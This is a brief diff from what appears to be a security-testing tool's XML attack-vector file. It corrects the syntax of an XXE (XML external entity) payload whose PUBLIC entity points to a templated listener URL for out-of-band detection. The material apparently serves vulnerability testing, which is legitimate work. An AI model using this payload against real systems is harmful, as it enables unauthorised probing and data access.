@@ -17,7 +17,7 @@
 </attackvector>
 <attackvector type="public">
 <directMessage><![CDATA[<!DOCTYPE data [
-<!ENTITY dos PUBLIC p "§tf_listenURL§" >
+<!ENTITY dos PUBLIC "p" "§tf_listenURL§" >
 ]>
 <data>&dos;</data>]]></directMessage>
 </attackvector>
